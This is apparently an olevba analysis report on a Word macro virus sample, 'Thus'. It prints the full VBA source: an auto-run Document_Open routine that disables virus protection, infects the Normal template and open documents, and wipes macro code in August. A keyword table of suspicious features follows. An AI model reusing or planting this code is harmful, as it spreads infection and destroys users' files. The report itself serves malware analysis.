olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-05e696e0200b30b9de1cbd183c01ac30ac0d6afd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-05e696e0200b30b9de1cbd183c01ac30ac0d6afd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
'Thus_001'
'antivirus'
On Error Resume Next
Application.Options.VirusProtection = False
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'antivirus'" Then
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
  .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
  .CodeModule.CountOfLines
End If
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
  .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
  .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
  .Item(1).CodeModule.CountOfLines)
End If
If NormalTemplate.Saved = False Then NormalTemplate.Save
  For k = 1 To Application.Documents.Count
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'antivirus'" Then
      Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
      .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
       .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
      Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
      .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
      .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
      .VBComponents.Item(1).CodeModule.CountOfLines)
    End If
  Next k
  If (Month(Now()) = 8) Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
    .CodeModule.CountOfLines
    For k = 1 To Application.Documents.Count
      Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
      .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
      .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    Next k
  End If
End Sub
































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

